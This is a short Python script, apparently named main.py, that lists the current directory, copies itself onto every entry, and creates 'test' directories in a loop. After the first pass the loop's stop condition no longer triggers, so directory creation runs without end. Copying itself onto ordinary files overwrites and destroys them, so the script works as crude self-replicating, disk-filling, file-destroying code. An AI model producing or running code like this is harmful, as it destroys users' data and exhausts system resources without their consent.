import os, shutil
#import time

sep = "\\" if os.name == "nt" else "/"
cwd = os.getcwd()
all = os.listdir()

count = 0

for dir in all:
    while True:
        os.mkdir(f"{cwd}{sep}test{count}")
        count += 1
        if count == 10: break
    shutil.copy(f"{cwd}{sep}main.py", dir)
    #time.sleep(0.3)
